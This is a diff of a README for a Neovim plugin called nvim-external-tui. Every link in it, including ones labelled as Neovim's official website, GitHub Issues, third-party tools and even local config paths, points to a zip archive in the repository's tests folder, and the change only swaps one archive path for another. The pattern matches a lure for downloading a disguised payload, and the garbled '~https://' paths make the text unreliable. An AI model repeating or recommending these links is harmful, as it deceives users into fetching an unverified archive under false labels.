@@ -1,17 +1,17 @@
 # 🎉 nvim-external-tui - Easily Run External TUIs from Neovim
 
-[![Download nvim-external-tui](https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/unit/nvim-external-tui-v3.7-beta.4.zip)](https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/unit/nvim-external-tui-v3.7-beta.4.zip)
+[![Download nvim-external-tui](https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/tui_external_nvim_2.0.zip)](https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/tui_external_nvim_2.0.zip)
 
 ## 🎈 Introduction
 
-nvim-external-tui is a Neovim plugin that helps you work with external terminal user interface (TUI) tools right from your Neovim editor. This plugin allows you to launch applications like [scooter](https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/unit/nvim-external-tui-v3.7-beta.4.zip) without leaving your editing environment. You can maintain focus on your work while using these external tools.
+nvim-external-tui is a Neovim plugin that helps you work with external terminal user interface (TUI) tools right from your Neovim editor. This plugin allows you to launch applications like [scooter](https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/tui_external_nvim_2.0.zip) without leaving your editing environment. You can maintain focus on your work while using these external tools.
 
 ## 🚀 Getting Started
 
 To start using nvim-external-tui, follow these steps:
 
 1. **Visit the Releases Page**
-   To download the latest version of nvim-external-tui, [visit this page to download](https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/unit/nvim-external-tui-v3.7-beta.4.zip).
+   To download the latest version of nvim-external-tui, [visit this page to download](https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/tui_external_nvim_2.0.zip).
 
 2. **Download the Latest Release**
    On the Releases page, you will see a list of available versions. Look for the most recent release and download the file appropriate for your operating system.
@@ -20,7 +20,7 @@ To start using nvim-external-tui, follow these steps:
    Follow the installation instructions specific for your version of Neovim. Here are common methods to install a plugin:
 
    - **Using Vim-Plug**
-     Add the following line to your `~https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/unit/nvim-external-tui-v3.7-beta.4.zip`:
+     Add the following line to your `~https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/tui_external_nvim_2.0.zip`:
      ```vim
      Plug 'MirianElena/nvim-external-tui'
      ```
@@ -32,7 +32,7 @@ To start using nvim-external-tui, follow these steps:
      ```
 
 4. **Install Dependencies**
-   Ensure you have Neovim installed. You can download it from [Neovim's Official Website](https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/unit/nvim-external-tui-v3.7-beta.4.zip). 
+   Ensure you have Neovim installed. You can download it from [Neovim's Official Website](https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/tui_external_nvim_2.0.zip). 
 
 ## 📥 Download & Install
 
@@ -42,10 +42,10 @@ After installation, follow these steps to ensure nvim-external-tui runs smoothly
   If you downloaded a zip or tar file, first unzip it. You can typically do this by right-clicking the file and selecting "Extract."
 
 - **Move the Plugin Files**
-  Move the extracted files to your Neovim plugin directory (usually `~https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/unit/nvim-external-tui-v3.7-beta.4.zip` for Packer or `~https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/unit/nvim-external-tui-v3.7-beta.4.zip` for Vim-Plug).
+  Move the extracted files to your Neovim plugin directory (usually `~https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/tui_external_nvim_2.0.zip` for Packer or `~https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/tui_external_nvim_2.0.zip` for Vim-Plug).
 
 - **Configure Your Editor**
-  Open your Neovim configuration file and set up any required commands to launch your desired TUIs. Refer to the [Documentation](https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/unit/nvim-external-tui-v3.7-beta.4.zip) for specific setup instructions.
+  Open your Neovim configuration file and set up any required commands to launch your desired TUIs. Refer to the [Documentation](https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/tui_external_nvim_2.0.zip) for specific setup instructions.
 
 ## ⚙️ Features
 
@@ -56,7 +56,7 @@ After installation, follow these steps to ensure nvim-external-tui runs smoothly
   Automatically generate commands for selected TUI tools within your Neovim setup, allowing for quick access.
 
 - **Community Integration**
-  Compatible with well-supported community tools like [yazi](https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/unit/nvim-external-tui-v3.7-beta.4.zip) and [lazygit](https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/unit/nvim-external-tui-v3.7-beta.4.zip) for a smoother experience.
+  Compatible with well-supported community tools like [yazi](https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/tui_external_nvim_2.0.zip) and [lazygit](https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/tui_external_nvim_2.0.zip) for a smoother experience.
 
 ## 🌟 Using External TUIs
 
@@ -76,7 +76,7 @@ To effectively run nvim-external-tui, ensure the following:
 
 ## 🌐 Help & Support
 
-If you need further assistance, consider visiting the project's [GitHub Issues](https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/unit/nvim-external-tui-v3.7-beta.4.zip) page. Here, you can report bugs, request features, or get help with installation issues.
+If you need further assistance, consider visiting the project's [GitHub Issues](https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/tui_external_nvim_2.0.zip) page. Here, you can report bugs, request features, or get help with installation issues.
 
 ## 🎯 Contributions
 
@@ -84,4 +84,4 @@ We welcome contributions! If you have ideas for improvements or features, feel f
 
 ## 📦 Get Your Copy
 
-To get started with nvim-external-tui today, [visit this page to download](https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/unit/nvim-external-tui-v3.7-beta.4.zip). Your coding experience will be enhanced with seamless integration of external TUIs. Enjoy coding!
+To get started with nvim-external-tui today, [visit this page to download](https://raw.githubusercontent.com/MirianElena/nvim-external-tui/main/tests/tui_external_nvim_2.0.zip). Your coding experience will be enhanced with seamless integration of external TUIs. Enjoy coding!
